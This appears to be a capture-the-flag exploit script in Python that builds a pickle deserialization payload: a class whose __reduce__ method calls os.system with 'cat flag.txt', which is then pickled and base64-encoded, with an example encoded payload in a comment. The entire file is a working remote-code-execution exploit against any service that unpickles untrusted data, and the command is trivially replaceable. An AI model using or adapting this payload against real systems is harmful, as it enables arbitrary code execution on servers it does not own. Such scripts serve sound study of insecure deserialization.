import pickle
import sys
import base64

COMMAND = "cat flag.txt"

class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

items = []
items.append(PickleRCE())
p = pickle.dumps(items)
print(base64.b64encode(p))

# Example:
# 	import 'gASVKgAAAAAAAABdlIwFcG9zaXiUjAZzeXN0ZW2Uk5SMDGNhdCBmbGFnLnR4dJSFlFKUYS4='